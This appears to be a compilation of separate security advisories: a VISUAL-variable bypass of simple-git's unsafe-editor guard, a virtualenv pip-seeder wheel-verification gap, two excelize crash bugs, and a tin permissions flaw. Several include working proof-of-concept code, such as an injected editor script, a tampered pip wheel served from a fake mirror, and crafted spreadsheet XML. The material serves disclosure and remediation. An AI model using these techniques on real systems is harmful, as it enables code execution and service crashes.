| Package | `@simple-git/argv-parser` (npm, `pkg:npm/%40simple-git/argv-parser`) |
| Repository | https://github.com/steveukx/git-js |
| Component | `parseEnv` (`packages/argv-parser/src/env/parse-env.ts`), reached via `vulnerabilityCheck(tokens, env)` |
| Vulnerability class | Security-control bypass — incomplete denylist in unsafe-editor detection |
| Verified against | `c427fbad33f1f2b11341f1cf852eedecbb106400` (`@simple-git/argv-parser` 1.1.1), plus the published npm artifact 1.1.1; `main` at `98864c6` observed still unpatched |
| API surface | Public documented API (`parseEnv(raw)` / `vulnerabilityCheck(tokens, env)`) |
| Affected in default configuration | Yes — reproduced with `blockUnsafeOperationsPlugin` under default options, with no unsafe allowances enabled |

## Summary

`GitEnvKeys` in `packages/argv-parser/src/env/parse-env.ts` maps only `editor`, `git_editor` and `git_sequence_editor` to the `allowUnsafeEditor` category. `prepareEnv` keeps an environment entry only when its lowercased name is a known `GitEnvKey` or starts with `git`, so `VISUAL` is discarded before `collectConfigVulnerabilities` ever inspects it. Git, however, falls back to `VISUAL` when resolving an editor, so `parseEnv({ VISUAL: '/tmp/evileditor' })` reports no vulnerability while an interactive Git operation will execute that binary.

In a consuming application the shape is: environment values derived from a request or job are forwarded into the child Git environment and classified by this parser before spawn. The parser exists to classify exactly such values, and the equivalent `EDITOR` or `GIT_EDITOR` value is rejected — so the attacker gains an editor substitution that the guard is specifically designed to block.

- `EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)
- `GIT_EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)
- `GIT_SEQUENCE_EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)
- `VISUAL` -> **absent from `GitEnvKeys`; dropped by `prepareEnv`, lines 60-68 — no vulnerability emitted**

## Impact

A consuming application that allows attacker-influenced environment values can have an attacker-selected executable launched by Git during operations such as `git commit --amend`, bypassing the parser's default unsafe-editor protection. Execution happens as the host user running the Git child process, with the attacker's binary invoked against the repository's editor file (for example `.git/COMMIT_EDITMSG`, or `.git/rebase-merge/git-rebase-todo` for `git rebase -i`).

The new capability is the bypass itself: without this gap, the same attacker-supplied value under `EDITOR`, `GIT_EDITOR` or `GIT_SEQUENCE_EDITOR` is refused unless the consumer explicitly opts in to `allowUnsafeEditor`. With `VISUAL`, the equivalent code execution proceeds with no opt-in and no reported vulnerability. `VISUAL` also takes precedence over `EDITOR`, the variable the parser does flag.

Scoring note: no CVSS vector or score is available for this finding, and one is not asserted here. Exploitability depends on the consuming application's data flow — specifically whether attacker-influenced environment entries reach the Git child environment. Consumers that never forward untrusted environment values into Git, or that always set a higher-priority `GIT_EDITOR` or `core.editor`, are not affected.

## Preconditions

1. The consumer forwards attacker-influenced environment entries into the environment passed to child Git (for example via simple-git's `.env()`), and classifies them with this parser before spawn.
2. The Git command opens an editor — for example `commit` without `-m`, `commit --amend`, or `rebase -i`.
3. No higher-priority editor setting overrides `VISUAL`: `GIT_EDITOR`, `core.editor` and `EDITOR` are absent (`GIT_EDITOR` and `core.editor` take precedence; `VISUAL` itself overrides `EDITOR`).
4. `TERM` is set to a value other than exactly `dumb` — Git consults `VISUAL` only then. `TERM` is neither a `GitEnvKey` nor `git`-prefixed, so an attacker who controls the environment object supplies it too and the parser reports nothing for it either.
5. The attacker-selected executable exists and is runnable on the host.

This requires no non-standard usage, no monkey-patching and no unusual configuration: the affected path is the documented, default-enabled guard. `docs/PLUGIN-UNSAFE-ACTIONS.md` ("Text editor") documents this control as covering editor environment variables that substitute an arbitrary binary, but lists only `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR`; Git's `VISUAL` fallback is not mentioned, and the string `visual` does not appear anywhere in the repository at the verified commit. The docs do state that supplying environment values is the caller's responsibility, but they do not warn that `VISUAL` is outside the guard.

The feed payload's precondition list also carries entries relating to a separate `GIT_CONFIG_PARAMETERS` / `allowUnsafeConfigEnvCount` config-injection scenario. Those were not needed here: the bypass was reproduced with default options and no unsafe allowances enabled.

## Data flow

1. **Source** — the attacker-influenced `raw` environment object enters the public parser entry point: `parseEnv(raw)` ([`packages/argv-parser/src/env/parse-env.ts:70`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L70)).
2. **Propagation** — `prepareEnv` lowercases keys and retains only known `GitEnvKeys` or names starting with `git`; `visual` is neither, so the entry is dropped before any analysis sees it ([`packages/argv-parser/src/env/parse-env.ts:60-68`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L60-L68)).
3. **Sink** — `collectConfigVulnerabilities` therefore never emits `allowUnsafeEditor` for `VISUAL`, and `vulnerabilityCheck(tokens, env)` returns an empty list ([`packages/argv-parser/src/env/parse-env.ts:45-54`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L45-L54)).
4. **Reachability** — simple-git's `blockUnsafeOperationsPlugin` passes its environment into `vulnerabilityCheck` before spawn; an empty vulnerability list means the Git child process is allowed to start ([`simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts:12-20`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts#L12-L20)).

## Vulnerable code

`packages/argv-parser/src/env/parse-env.ts`, lines 5-27 at `c427fbad33f1f2b11341f1cf852eedecbb106400`:

```ts
const GitEnvKeys = {
   'editor': 'allowUnsafeEditor',
   // ...
   'git_editor': 'allowUnsafeEditor',
   // ...
   'git_sequence_editor': 'allowUnsafeEditor',
   // VISUAL missing
} as const satisfies Record<string, VulnerabilityCategory>;
```

The three mapped keys are the safe siblings; the missing `visual` entry is the gap. Because `prepareEnv` (lines 60-68) filters on this map plus a `git` prefix, the omission is not merely a missing classification — the value never reaches the classifier at all.

## Reproduction

**Verified** — reproduced dynamically, end to end, against a checkout of `c427fbad33f1f2b11341f1cf852eedecbb106400` (`packages/argv-parser/package.json` = 1.1.1) and against the published npm artifact 1.1.1.

Observed at the parser level (vitest PoC run against the repo):

- `parseEnv({ EDITOR })`, `parseEnv({ GIT_EDITOR })` and `parseEnv({ GIT_SEQUENCE_EDITOR })` each yield one `allowUnsafeEditor` vulnerability.
- `parseEnv({ VISUAL: '/tmp/poc/evileditor' })` yields `[]` in every casing.
- `vulnerabilityCheck(['commit', '--amend'], { VISUAL })` — the exact call the spawn guard makes — returns `[]`.
- The published `dist/index.cjs` of 1.1.1 contains zero occurrences of `visual`; the same holds for the repository at the verified commit, including `docs/PLUGIN-UNSAFE-ACTIONS.md`.

Observed at the Git level (only `VISUAL` set, `EDITOR` and `GIT_EDITOR` unset): `git var GIT_EDITOR` returned the attacker path; `git commit --amend` executed the attacker script (marker written, commit subject rewritten); `git rebase -i` executed it for the rebase-todo as well. `VISUAL` also took precedence over `EDITOR` (`EDITOR=/bin/true VISUAL=evil` -> `evil`).

Observed end to end through the real spawn path (simple-git built from this commit, default options, no unsafe allowances): the `EDITOR` and `GIT_EDITOR` variants both threw `GitPluginError` — "Use of ... is not permitted without enabling allowUnsafeEditor" — with no execution. The `VISUAL` variant was **not** blocked: the plugin saw an empty vulnerability list, Git spawned, and the attacker-supplied editor executed as the host user against `.git/COMMIT_EDITMSG`, rewriting the commit message.

Minimal Git-level reproduction:

```sh
#!/bin/sh
set -e
rm -rf /tmp/visual-repo /tmp/GIT_VISUAL_POC /tmp/evileditor
mkdir /tmp/visual-repo && cd /tmp/visual-repo
git init -q
git config user.email a@a && git config user.name a
touch a && git add a && git commit -qm init
printf '#!/bin/sh\ntouch /tmp/GIT_VISUAL_POC\nexit 1\n' >/tmp/evileditor
chmod +x /tmp/evileditor
env -u EDITOR -u GIT_EDITOR VISUAL=/tmp/evileditor git commit --amend || true
test -e /tmp/GIT_VISUAL_POC && echo executed
```

Guard-level reproduction, using the public API:

```ts
import { vulnerabilityCheck } from '@simple-git/argv-parser';
import { spawnSync } from 'node:child_process';
const args = ['commit', '--amend'];
const env = { VISUAL: '/tmp/evileditor' };
if (vulnerabilityCheck(args, env).length === 0) spawnSync('git', args, { env });
```

- **Expected:** `parseEnv({ VISUAL: '/tmp/evileditor' }).vulnerabilities` contains `allowUnsafeEditor`, and the spawn guard refuses the operation unless the consumer has enabled `allowUnsafeEditor` — the behaviour already applied to `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR`.
- **Actual:** no vulnerability is reported, the guard permits the spawn, and Git executes the attacker-selected binary.

## Suggested remediation

Treat `VISUAL` as an editor source, so Git's own editor-resolution precedence is fully covered by the denylist.

```ts
const GitEnvKeys = {
   'editor': 'allowUnsafeEditor',
   'visual': 'allowUnsafeEditor',
   // ...
   'git_editor': 'allowUnsafeEditor',
   // ...
   'git_sequence_editor': 'allowUnsafeEditor',
} as const satisfies Record<string, VulnerabilityCategory>;
```

Because `prepareEnv` filters on `GitEnvKeys` membership, this single entry is enough to make `visual` survive filtering and be classified; no change to `prepareEnv` or `collectConfigVulnerabilities` is required.

Notes:

- `TERM` is likewise neither a `GitEnvKey` nor `git`-prefixed, and it is the variable that decides whether Git consults `VISUAL` at all (`TERM=dumb` or unset means `VISUAL` is ignored). An attacker who controls the environment object supplies it alongside `VISUAL`; whether `TERM` warrants its own classification is a maintainer judgement call, but it is worth considering while fixing this.
- `git rebase -i` reaches the same sink: `git_sequence_editor` falls back to normal editor resolution, so the `VISUAL` path executes the attacker binary against the rebase-todo file as well.
- `docs/PLUGIN-UNSAFE-ACTIONS.md` ("Text editor") should list `VISUAL` alongside `EDITOR` / `GIT_EDITOR` / `GIT_SEQUENCE_EDITOR`, since the documented scope of the control is what consumers rely on.
- Already safe and needing no change: `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR` are all correctly classified and enforced by the plugin, and the parser's handling of `git`-prefixed variables is unaffected.

Suggested regression test alongside `test/parse-env.spec.ts` (which currently covers `EDITOR` / `GIT_EDITOR` / `GIT_SEQUENCE_EDITOR` / `PAGER` but has no `VISUAL` case): assert that `parseEnv({ VISUAL: '/tmp/evileditor' })` yields one `allowUnsafeEditor` vulnerability in every casing, and that `vulnerabilityCheck(['commit', '--amend'], { VISUAL: '/tmp/evileditor' })` returns that vulnerability rather than `[]`. A precedence case is worth adding too: `VISUAL` set together with `EDITOR` must still be flagged, since `VISUAL` wins in Git's resolution order.

cves.summary: ## Summary The pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected. Index candidates on that path do not pass through virtualenv's wheel digest verification. Anthropic's OSS Scanner reported this as `ANT-2026-74ALJBUF` in `virtualenv-20261015-005`, received on 15 October 2026. ## Affected area Wheel selection by the pip seeder when downloads are enabled. ## Attacker-controlled input The pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy. Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy. ## Affected code The relevant 21.14.8 source is in [pip seeder](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/pip_invoke.py). ## Mechanism With `--seeder pip --download`, `PipInvoke.get_pip_install_cmd()` first calls `get_wheel(download=False)`, so virtualenv's `download_wheel()` and `verify_wheel_digest()` are skipped. It then lets `pip install` consult the configured index. An index wheel with the same package and version as the bundled wheel can be selected without virtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for the same option. ## Reproduction and evidence The scanner built a local index named in `pip.conf` that served a modified copy of the bundled pip wheel under the same filename. In the control run, `virtualenv --download env-default` rejected the wheel with a digest mismatch. In the second run, adding `--seeder pip` produced an environment whose installed `pip/__init__.py` matched the index wheel; `env-pip/bin/pip --version` ran the added line. The reproducer checked the installed bytes and marker before reporting `BUG`. Both `--seeder pip` and `--download` are needed. The report used a non-PyPI index from `pip.conf` and left `PIP_INDEX_URL`, `PIP_EXTRA_INDEX_URL`, and `PIP_INDEX` unset, so virtualenv's default-seeder PyPI comparison remained active. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path is older, while the comparison with the default seeder arose when digest verification was added in 21.7.12. [PR #3430](https://github.com/pypa/virtualenv/pull/3430) acquires and verifies selected wheels before invoking pip with index lookup disabled. ## Attack sequence ```mermaid sequenceDiagram participant I as Index in pip.conf participant V as virtualenv PipInvoke participant P as pip install participant E as Seeded environment I->>V: serve modified pip wheel V->>V: get_wheel(download=False) V->>P: install with --download permitting index lookup P->>I: select same-version index wheel I->>E: modified pip installed without virtualenv digest check E->>E: later pip invocation runs added code Note over V,E: Default app-data seeder rejects the same digest ``` ## Reproducer files The following files are from the scanner report for `ANT-2026-74ALJBUF`. They were tested against commit `a857a7823c73` in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update. **`repro`** ```text #!/usr/bin/env python3 import glob import hashlib import json import os import shutil import subprocess import sys import zipfile from virtualenv.seed.wheels.embed import get_embed_wheel companions = "/tmp/repro.d" work = "/tmp/repro-pip-seeder-download" shutil.rmtree(work, ignore_errors=True) os.makedirs(work) # set up: the pip wheel virtualenv bundles, and PyPI's record of its sha256 (served by virtualenv_offline.py: no network) bundled = get_embed_wheel("pip", f"{sys.version_info.major}.{sys.version_info.minor}") pypi_sha256 = hashlib.sha256(open(bundled.path, "rb").read()).hexdigest() pypi_release = {"filename": bundled.name, "digests": {"sha256": pypi_sha256}} os.makedirs(f"{work}/pypi.org/pypi/pip") with open(f"{work}/pypi.org/pypi/pip/json", "w") as pypi_json: json.dump({"releases": {bundled.version: [pypi_release]}}, pypi_json) # attacker: the mirror serves other bytes under the bundled wheel's own file name marker = f"{work}/MIRROR_CODE_RAN" subprocess.run([sys.executable, f"{companions}/make_mirror.py", str(bundled.path), f"{work}/mirror", marker], check=True) mirror_wheel = f"{work}/mirror/pip/{bundled.name}" mirror_sha256 = hashlib.sha256(open(mirror_wheel, "rb").read()).hexdigest() print(f"{bundled.name}: PyPI publishes sha256 {pypi_sha256}") print(f"{bundled.name}: the mirror serves sha256 {mirror_sha256}") # user: pip.conf names the mirror; PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_INDEX (which turn the check off) are unset with open(f"{work}/pip.conf", "w") as pip_conf: pip_conf.write(f"[global]\nindex-url = file://{work}/mirror\n") # file:// stands in for the mirror's http URL os.makedirs(f"{work}/home-default") os.makedirs(f"{work}/home-pip") # one HOME per run, so neither sees the other's app-data or pip cache virtualenv = [sys.executable, f"{companions}/virtualenv_offline.py", f"{work}/pypi.org", "--no-periodic-update"] # control: the default seeder with --download fetches the mirror's wheel and refuses it default_seeder = subprocess.run( [*virtualenv, "--download", f"{work}/env-default"], env={**os.environ, "HOME": f"{work}/home-default", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) refusal = [line for line in default_seeder.stdout.splitlines() if line.startswith("RuntimeError: ")] print(f"\nCONTROL virtualenv --download env-default: exit {default_seeder.returncode}") print("\n".join(refusal)) # trigger: the same command plus --seeder pip pip_seeder = subprocess.run( [*virtualenv, "--download", "--seeder", "pip", f"{work}/env-pip"], env={**os.environ, "HOME": f"{work}/home-pip", "PIP_CONFIG_FILE": f"{work}/pip.conf"}, capture_output=True, text=True, ) print(f"\nOBSERVED virtualenv --download --seeder pip env-pip: exit {pip_seeder.returncode}") print(pip_seeder.stdout) if pip_seeder.returncode == 0: env_pip = subprocess.run([f"{work}/env-pip/bin/pip", "--version"], capture_output=True, text=True, check=True) print(f"$ env-pip/bin/pip --version\n{env_pip.stdout}") # check: compare env-pip's pip/__init__.py with the one in each wheel with zipfile.ZipFile(bundled.path) as wheel: bundled_init = wheel.read("pip/__init__.py") with zipfile.ZipFile(mirror_wheel) as wheel: mirror_init = wheel.read("pip/__init__.py") installed = glob.glob(f"{work}/env-pip/lib/python*/site-packages/pip/__init__.py") installed_init = open(installed[0], "rb").read() if installed else b"" refusal_message = f"has sha256 {mirror_sha256}, but PyPI reports {pypi_sha256}" refused = default_seeder.returncode != 0 and refusal_message in default_seeder.stdout print(f"default seeder refused the mirror's wheel for its digest: {refused}") print(f"env-pip's pip/__init__.py is the bundled wheel's: {installed_init == bundled_init}, the mirror's: {installed_init == mirror_init}") print(f"the mirror's line ran on env-pip/bin/pip --version: {os.path.exists(marker)}") print("BUG" if refused and installed_init == mirror_init and os.path.exists(marker) else "OK") ``` **`repro.d/make_mirror.py`** ```text #!/usr/bin/env python3 # usage: make_mirror.py import os import sys import zipfile genuine_wheel, mirror, marker = sys.argv[1:] wheel_name = os.path.basename(genuine_wheel) payload = f"\nopen({marker!r}, 'w').write('mirror code ran')\n" os.makedirs(f"{mirror}/pip") with zipfile.ZipFile(genuine_wheel) as genuine, zipfile.ZipFile(f"{mirror}/pip/{wheel_name}", "w") as served: for entry in genuine.infolist(): data = genuine.read(entry) if entry.filename == "pip/__init__.py": data += payload.encode() served.writestr(entry, data) # PEP 503 project page; pip reads /pip/index.html for a file:// index with open(f"{mirror}/pip/index.html", "w") as page: page.write(f'{wheel_name}\n') ``` **`repro.d/virtualenv_offline.py`** ```text #!/usr/bin/env python3 # usage: virtualenv_offline.py # The `virtualenv` command, except that the PyPI JSON API request (the source of the digest the default seeder # checks) is answered from a local file, as tests/unit/seed/wheels/test_periodic_update.py does. pip is not touched. import sys from virtualenv.__main__ import run_with_catch from virtualenv.seed.wheels import periodic_update pypi_org = sys.argv[1] def pypi_json_api(url, context=None): return open(url.replace("https://pypi.org", pypi_org), "rb") periodic_update.urlopen = pypi_json_api run_with_catch(sys.argv[2:]) ``` ## Impact The default-index digest-verification step can be omitted when the pip seeder downloads packages. This does not by itself defeat TLS or establish control of an index response. Severity: low. ## Versions tested The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9. The fix acquires wheels through the shared verification path and installs pinned names with index lookup disabled. A private temporary directory contains only the selected archives. This preserves version pins in pip freeze output. Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430). ## Known mitigation On older releases, use embedded wheels without downloads, or acquire and verify approved seed archives separately. ## Affected release - [x] The problem reproduces on virtualenv 21.14.8. ## Credits Reported by Anthropic's OSS Scanner as ANT-2026-74ALJBUF.

### Summary

`ColumnNameToNumber` (lib.go:220-237) accumulates the bijective base-26 value of a column name in an int64 with only an upper-bound check (`col > MaxColumns`) applied after the loop and no overflow detection. A 14-letter column name whose true value is 3·2⁶⁴ — e.g. **`VGWQHXLSDVIKWV`** — wraps to `col = 0` and passes the guard, so `CellNameToCoordinates("VGWQHXLSDVIKWV1")` returns `(col=0, row=1, err=nil)`.

When normalizing a `r="0"` row, `checkSheetR0` (excelize.go:417-443, called from `checkSheet` at excelize.go:405) runs its `checkRow` closure with `col = 0`: `colIdx := col - 1` becomes **-1**, and `sheetData.Row[rowIdx].C[-1]` (excelize.go:424) raises an unrecovered `panic: runtime error: index out of range [-1]`, killing the host process.

### Details

- The row side of the same coordinate gate is enforced (`checkRowNum` at excelize.go:342-350 bounds `r` before the `make([]xlsxRow, row)` allocation; this includes the fix for GHSA-h69g-9hx6-f3v4 / CVE-2026-54063, present in the audited commit). The **column** side is not: `checkSheet`/`lastRowNum`/`checkSheetR0` treat `err == nil` from `CellNameToCoordinates` as proof of an in-domain coordinate (excelize.go:356, :438), which is unsound because of the wrap-around above.
- The same unsound gate also feeds `ws.SheetData.Row[rowIdx].C[colNum-1]` in `xlsxWorksheet.checkRow` (rows.go:969): a row combining a valid large column (e.g. `XFD1`) with an overflowed column panics identically.
- Reachable from any `workSheetReader`-based API on an attacker-supplied worksheet: `GetCellValue`, `GetCellFormula`, `SetCellValue`, `GetMergeCells`, `GetSheetDimension`, `GetColWidth`, `AddTable`, etc.
- Probe on pristine master: `ColumnNameToNumber("VGWQHXLSDVIKWV")` returns `(0, nil)`.
- This is a distinct root cause from GHSA-h69g-9hx6-f3v4 (row-index allocation): different mechanism (int64 wrap-around → negative index, not oversized allocation), different sink, different fix.

### PoC

A standalone program (public API only) was provided to the maintainer by email (`3-column-overflow`): it builds a workbook in memory whose `xl/worksheets/sheet1.xml` contains `<sheetData><row r="0"><c r="VGWQHXLSDVIKWV1" t="inlineStr"><is><t>pwn</t></is></c></row></sheetData>` (<1 KB of attacker XML), calls `OpenReader`, then `GetCellValue("Sheet1", "A1")` → `PANIC_REPRODUCED: runtime error: index out of range [-1]` on master `ecd99d761fe0` (2026-09-08). With the proposed patch the same program prints `NO_PANIC_BLOCKED`.

### Impact

A <1 KB crafted `.xlsx` crashes any service that opens a user-supplied spreadsheet and reads it — upload processing, mail-scanning pipelines, spreadsheet conversion endpoints. Remote, unauthenticated, no privileges.

### Proposed fix

Bound the accumulated value inside the loop: check `col > MaxColumns` after each digit. Every digit is at least 1, so any name whose true value exceeds MaxColumns crosses the bound inside the loop, before the accumulation can wrap or overflow — this provably covers all cases, including wraps that would land back inside `[1, MaxColumns]`. A complete patch has been provided to the maintainer.

`leftRight` (calc.go:14236) tests the length with `countUTF16String`, which counts a rune above U+FFFF as 2. The RIGHT branch on 14241 then slices `[]rune(text)` at `utf8.RuneCountInString(text)-numChars`, which counts it as 1. For text with N such runes the two measures are 2N and N, so any `numChars` between them passes the guard and gives a negative index. The `numChars < 0` check at 14216 does not help, since the value that gets through is positive.

What makes it worth reporting is `AutoFitColWidth`, which evaluates formulas without looking like it does, so normalising an uploaded sheet is enough to reach it. One scoping correction to my own wording there: `AutoFitColWidth` was added in v2.11.0 and does not exist at v2.10.1, so on v2.10.1 the only reachable path is an explicit `CalcCellValue`.

A 6,077-byte file containing two U+1D7D9 characters in A1 and  RIGHT(A1,3)  in B1 was created and then opened in a separate program without recovery enabled:

```
v2.9.1    ok
v2.10.0   ok
v2.10.1   panic: slice bounds out of range [-1:]
v2.11.0   panic: slice bounds out of range [-1:]
```

So it is a regression, not an old defect. Commit a880146 (2026-01-16) moved the guard to `countUTF16String` and left the slice on the rune index, and `git tag --contains` gives v2.10.1 and v2.11.0 only.

RIGHT only. RIGHTB reaches the same function but takes the byte branch at 14225, which is internally consistent, and I probed MID and MIDB from 1 to 5 with no panic. It is the same negative-index family as GHSA-fx5j-qcqg-grpf and GHSA-48hm-4h8j-58fg, though those are shared-string lookups in the reader rather than a unit mismatch in the formula library.

tin 1.40 creates the .tin directory with insecure permissions, which allows local users to read passwords from the .inputhistory file.
